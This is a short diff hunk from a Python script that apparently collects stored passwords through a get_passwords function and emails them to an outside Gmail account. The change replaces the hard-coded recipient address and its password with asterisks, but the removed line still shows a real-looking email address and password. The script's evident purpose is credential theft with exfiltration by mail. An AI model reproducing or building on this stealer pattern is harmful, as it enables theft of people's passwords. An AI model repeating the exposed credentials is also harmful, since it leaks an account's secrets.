@@ -35,4 +35,4 @@ def get_passwords():
 
 if __name__ == '__main__':
     passwords = get_passwords()
-    send_mail("smartsecureuniverse@gmail.com", "Sc0 rpi 0n", passwords)
+    send_mail("******@gmail.com", "******", passwords)
